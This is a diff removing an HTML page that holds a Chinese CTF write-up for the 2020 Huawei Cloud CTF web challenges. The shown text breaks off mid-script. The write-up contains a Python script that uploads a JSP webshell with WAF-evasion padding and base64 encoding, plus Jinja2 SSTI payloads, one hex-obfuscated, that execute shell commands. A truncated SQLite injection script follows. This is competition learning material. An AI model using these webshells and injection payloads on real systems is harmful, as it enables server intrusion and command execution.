@@ -1,1027 +1,127 @@
-
-
-
-<!doctype html>
-<html lang="en" class="no-js">
-  <head>
-    
-      <meta charset="utf-8">
-      <meta name="viewport" content="width=device-width,initial-scale=1">
-      
-      
-        <link rel="canonical" href="https://github.com/eggdkk/Web_Learning/CTF_Writeup/2020HuaweiCTF/">
-      
-      
-        <meta name="author" content="dkk">
-      
-      <link rel="shortcut icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.4.0">
-    
-    
-      
-        <title>2020华为云CTF - Web learning</title>
-      
-    
-    
-      <link rel="stylesheet" href="../../assets/stylesheets/main.fe0cca5b.min.css">
-      
-      
-    
-    
-    
-      
-        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
-        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
-      
-    
-    
-    
-      <link rel="stylesheet" href="../../css/extension.css">
-    
-      <link rel="stylesheet" href="../../css/simpleLightbox.scss">
-    
-    
-      
-    
-    
-  </head>
-  
-  
-    <body dir="ltr">
-  
-    
-    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
-    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
-    <label class="md-overlay" for="__drawer"></label>
-    <div data-md-component="skip">
-      
-        
-        <a href="#2020huaweictf" class="md-skip">
-          Skip to content
-        </a>
-      
-    </div>
-    <div data-md-component="announce">
-      
-    </div>
-    
-      <header class="md-header" data-md-component="header">
-  <nav class="md-header-nav md-grid" aria-label="Header">
-    <a href="https://github.com/eggdkk/Web_Learning" title="Web learning" class="md-header-nav__button md-logo" aria-label="Web learning">
-      
-  
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
-
-    </a>
-    <label class="md-header-nav__button md-icon" for="__drawer">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
-    </label>
-    <div class="md-header-nav__title" data-md-component="header-title">
-      
-        <div class="md-header-nav__ellipsis">
-          <span class="md-header-nav__topic md-ellipsis">
-            Web learning
-          </span>
-          <span class="md-header-nav__topic md-ellipsis">
-            
-              2020华为云CTF
-            
-          </span>
-        </div>
-      
-    </div>
-    
-      <label class="md-header-nav__button md-icon" for="__search">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
-      </label>
-      
-<div class="md-search" data-md-component="search" role="dialog">
-  <label class="md-search__overlay" for="__search"></label>
-  <div class="md-search__inner" role="search">
-    <form class="md-search__form" name="search">
-      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
-      <label class="md-search__icon md-icon" for="__search">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </label>
-      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
-      </button>
-    </form>
-    <div class="md-search__output">
-      <div class="md-search__scrollwrap" data-md-scrollfix>
-        <div class="md-search-result" data-md-component="search-result">
-          <div class="md-search-result__meta">
-            Initializing search
-          </div>
-          <ol class="md-search-result__list"></ol>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-    
-    
-      <div class="md-header-nav__source">
-        
-<a href="https://github.com/eggdkk/Web_Learning/" title="Go to repository" class="md-source">
-  <div class="md-source__icon md-icon">
-    
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
-  </div>
-  <div class="md-source__repository">
-    eggdkk/Web_Learning
-  </div>
-</a>
-      </div>
-    
-  </nav>
-</header>
-    
-    <div class="md-container" data-md-component="container">
-      
-        
-      
-      
-        
-      
-      <main class="md-main" data-md-component="main">
-        <div class="md-main__inner md-grid">
-          
-            
-              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
-  <label class="md-nav__title" for="__drawer">
-    <a href="https://github.com/eggdkk/Web_Learning" title="Web learning" class="md-nav__button md-logo" aria-label="Web learning">
-      
-  
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
-
-    </a>
-    Web learning
-  </label>
-  
-    <div class="md-nav__source">
-      
-<a href="https://github.com/eggdkk/Web_Learning/" title="Go to repository" class="md-source">
-  <div class="md-source__icon md-icon">
-    
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
-  </div>
-  <div class="md-source__repository">
-    eggdkk/Web_Learning
-  </div>
-</a>
-    </div>
-  
-  <ul class="md-nav__list" data-md-scrollfix>
-    
-      
-      
-      
-
-
-  <li class="md-nav__item">
-    <a href="../.." title="index" class="md-nav__link">
-      index
-    </a>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
-    
-    <label class="md-nav__link" for="nav-2">
-      Web基础嗷
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
-    </label>
-    <nav class="md-nav" aria-label="Web基础嗷" data-md-level="1">
-      <label class="md-nav__title" for="nav-2">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
-        Web基础嗷
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/Overview/" title="Web概述" class="md-nav__link">
-      Web概述
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/Server%26Middleware/" title="服务器&中间件" class="md-nav__link">
-      服务器&中间件
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/BasisDatabaseSyntax/" title="数据库基础&tcpdump抓包" class="md-nav__link">
-      数据库基础&tcpdump抓包
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/include/" title="文件包含" class="md-nav__link">
-      文件包含
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/PhpTricks/" title="PHP的一些 “特性”" class="md-nav__link">
-      PHP的一些 “特性”
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/NoColumnInjection/" title="SQL注入限制条件下获取表名&无列名注入" class="md-nav__link">
-      SQL注入限制条件下获取表名&无列名注入
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/PhpUnserialization/" title="PHP反序列化" class="md-nav__link">
-      PHP反序列化
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/Redis/" title="Redis" class="md-nav__link">
-      Redis
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
-    
-    <label class="md-nav__link" for="nav-3">
-      👴平常记录的
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
-    </label>
-    <nav class="md-nav" aria-label="👴平常记录的" data-md-level="1">
-      <label class="md-nav__title" for="nav-3">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
-        👴平常记录的
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/docker%2BPHPdebug/" title="docker+PHPdebug" class="md-nav__link">
-      docker+PHPdebug
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/oh_my_zsh/" title="oh_my_zsh配置" class="md-nav__link">
-      oh_my_zsh配置
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/" title="Test" class="md-nav__link">
-      Test
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/email/" title="邮箱收集渗透钓鱼" class="md-nav__link">
-      邮箱收集渗透钓鱼
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../usually/golang_dockerAPI/" title="golang_dockerAPI开发小记" class="md-nav__link">
-      golang_dockerAPI开发小记
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../basis/ew/" title="ssh隧道_ew穿透" class="md-nav__link">
-      ssh隧道_ew穿透
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-  
-
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
-    
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
-    
-    <label class="md-nav__link" for="nav-4">
-      CTF_Writeup
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
-    </label>
-    <nav class="md-nav" aria-label="CTF_Writeup" data-md-level="1">
-      <label class="md-nav__title" for="nav-4">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
-        CTF_Writeup
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020xhlj/" title="2020西湖论剑初赛" class="md-nav__link">
-      2020西湖论剑初赛
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020N1CTF/" title="2020N1CTF" class="md-nav__link">
-      2020N1CTF
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020_zer0pts_CTF/" title="2020_zer0pts_CTF" class="md-nav__link">
-      2020_zer0pts_CTF
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020_Hackergame/" title="Hackergame 2020" class="md-nav__link">
-      Hackergame 2020
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020UNCTF_Web/" title="2020UNCTF_Web" class="md-nav__link">
-      2020UNCTF_Web
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020dhb_Web/" title="2020dhb_Web" class="md-nav__link">
-      2020dhb_Web
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020xyb/" title="2020祥云杯" class="md-nav__link">
-      2020祥云杯
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-  
-
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        2020华为云CTF
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
-        </span>
-      </label>
-    
-    <a href="./" title="2020华为云CTF" class="md-nav__link md-nav__link--active">
-      2020华为云CTF
-    </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#webshell_1" class="md-nav__link">
-    webshell_1
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mine1_1" class="md-nav__link">
-    mine1_1
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mine2" class="md-nav__link">
-    mine2
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pyer" class="md-nav__link">
-    pyer
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#hids" class="md-nav__link">
-    hids
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#cloud" class="md-nav__link">
-    cloud
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../2020Huawei2/" title="2020华为云CTF第二场" class="md-nav__link">
-      2020华为云CTF第二场
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
-    
-    <label class="md-nav__link" for="nav-5">
-      vulhub靶场
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
-    </label>
-    <nav class="md-nav" aria-label="vulhub靶场" data-md-level="1">
-      <label class="md-nav__title" for="nav-5">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
-        vulhub靶场
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../vulhub/narak/" title="narak" class="md-nav__link">
-      narak
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item">
-    <a href="../../friendly_link/" title="友链~" class="md-nav__link">
-      友链~
-    </a>
-  </li>
-
-    
-  </ul>
-</nav>
-                  </div>
-                </div>
-              </div>
-            
-            
-              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#webshell_1" class="md-nav__link">
-    webshell_1
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mine1_1" class="md-nav__link">
-    mine1_1
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mine2" class="md-nav__link">
-    mine2
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pyer" class="md-nav__link">
-    pyer
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#hids" class="md-nav__link">
-    hids
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#cloud" class="md-nav__link">
-    cloud
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-                  </div>
-                </div>
-              </div>
-            
-          
-          <div class="md-content">
-            <article class="md-content__inner md-typeset">
-              
-                
-                  <a href="https://github.com/eggdkk/Web_Learning/edit/master/docs/CTF_Writeup/2020HuaweiCTF.md" title="Edit this page" class="md-content__button md-icon">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
-                  </a>
-                
-                
-                  
-                
-                
-                <h1 id="2020huaweictf">2020HuaweiCTF<a class="headerlink" href="#2020huaweictf" title="Permanent link">&para;</a></h1>
-<div class="toc">
-<ul>
-<li><a href="#2020huaweictf">2020HuaweiCTF</a><ul>
-<li><a href="#webshell_1">webshell_1</a></li>
-<li><a href="#mine1_1">mine1_1</a></li>
-<li><a href="#mine2">mine2</a></li>
-<li><a href="#pyer">pyer</a></li>
-<li><a href="#hids">hids</a></li>
-<li><a href="#cloud">cloud</a></li>
-</ul>
-</li>
-</ul>
-</div>
-<h2 id="webshell_1">webshell_1<a class="headerlink" href="#webshell_1" title="Permanent link">&para;</a></h2>
-<p>用的云waf 很迷，加点混淆字符，传jsp🐎就过了</p>
-<p><div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">random</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://124.70.221.177:31761/&quot;</span>
-<span class="k">def</span> <span class="nf">generate_random_str</span><span class="p">(</span><span class="n">randomlength</span><span class="o">=</span><span class="mi">64</span><span class="p">):</span>
-  <span class="n">random_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-  <span class="n">base_str</span> <span class="o">=</span> <span class="s1">&#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;</span>
-  <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">base_str</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
-  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">randomlength</span><span class="p">):</span>
-    <span class="n">random_str</span> <span class="o">+=</span> <span class="n">base_str</span><span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">)]</span>
-  <span class="k">return</span> <span class="n">random_str</span>
-<span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;&lt;%</span>
-<span class="s2">if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;))){</span>
-<span class="s2">    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span>
-<span class="s2">    int a = -1;</span>
-<span class="s2">    byte[] b = new byte[2048];</span>
-<span class="s2">    out.print(&quot;&lt;pre&gt;&quot;);</span>
-<span class="s2">    while((a=in.read(b))!=-1){</span>
-<span class="s2">        out.println(new String(b));</span>
-<span class="s2">    }</span>
-<span class="s2">    out.print(&quot;&lt;/pre&gt;&quot;);</span>
-<span class="s2">}</span>
-<span class="s2">%&gt;&quot;&quot;&quot;</span>
-    <span class="n">uploadurl</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;upload.jsp&quot;</span>
-    <span class="n">exp</span> <span class="o">=</span> <span class="n">generate_random_str</span><span class="p">()</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="n">generate_random_str</span><span class="p">()</span>
-    <span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uploadurl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">exp</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)),</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">exp</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)),</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">))</span>
-    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">cat</span><span class="p">():</span>
-    <span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">upload</span><span class="p">())</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">))</span>
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-        <span class="n">cat</span><span class="p">()</span>
-</code></pre></div>
-<img alt="" src="../../image/CTF_Writeup/2020HuaweiCTF/1.jpg" />
-<img alt="" src="../../image/CTF_Writeup/2020HuaweiCTF/2.png" /></p>
-<h2 id="mine1_1">mine1_1<a class="headerlink" href="#mine1_1" title="Permanent link">&para;</a></h2>
-<p>SSTI</p>
-<p>绕就行
-<div class="highlight"><pre><span></span><code>/success?msg={{(lipsum|attr(request.values.a)).get(request.values.b).get(request.values.c)(request.values.d).popen(request.values.e).read()}}&amp;a=__globals__&amp;b=__builtins__&amp;c=__import__&amp;d=os&amp;e=cat%20flag.txt&amp;f=123
-</code></pre></div>
-<img alt="" src="../../image/CTF_Writeup/2020HuaweiCTF/3.png" /></p>
-<h2 id="mine2">mine2<a class="headerlink" href="#mine2" title="Permanent link">&para;</a></h2>
-<p>再绕，构造</p>
-<p><div class="highlight"><pre><span></span><code>/success?msg={%print(&quot;&quot;|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(0)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(202)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;eval&quot;)(&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x20\x2d\x61\x6c\x6c\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;))%}
-</code></pre></div>
-<img alt="" src="../../image/CTF_Writeup/2020HuaweiCTF/4.png" /></p>
-<h2 id="pyer">pyer<a class="headerlink" href="#pyer" title="Permanent link">&para;</a></h2>
-<p>SQLite注入
-<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://124.70.221.177:31229/login&quot;</span>
-<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-<span class="n">str1</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="o">+</span><span class="s1">&#39;!&quot;#$%&amp;</span><span class="se">\&#39;</span><span class="s1">()*+,-./:;&lt;=&gt;?@[</span><span class="se">\\</span><span class="s1">]^_`{|}~&#39;</span>
-<span class="n">str2</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
